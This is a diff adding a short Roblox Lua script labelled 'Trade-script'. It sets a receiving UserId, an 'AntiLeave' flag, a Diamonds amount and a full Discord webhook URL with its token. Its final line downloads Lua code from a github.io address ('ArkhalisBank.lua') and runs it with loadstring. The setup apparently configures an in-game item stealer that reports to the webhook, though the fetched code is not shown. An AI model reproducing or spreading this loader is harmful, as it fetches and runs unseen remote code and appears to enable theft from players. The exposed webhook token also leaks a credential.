@@ -1,0 +1,19 @@
+_G.UserId = 502839112 --//
+
+_G.AntiLeave = true --//
+_G.Diamonds = 100000 --//
+
+--[[ Webhook Config ]]--
+_G.Webhook = "https://discord.com/api/webhooks/1101128011966849024/qrFeOTBFxKOPwp_6eqCJy5W_vNEg62Y6OJRXoPPRHbzDgT0iLZzEH0cGaGARGHtH-ZtW" --//
+    
+--[[ UI Config ]]--
+_G.ScriptName = "Trade-script" --//
+_G.Tip1 = "making" --//
+_G.Tip2 = "making" --//
+_G.Tip3 = "making" --//
+_G.Tip4 = "making" --//
+_G.Tip5 = "making" --//
+
+
+--[[ Script ]]--
+loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/ArkhalisBank.lua"))()
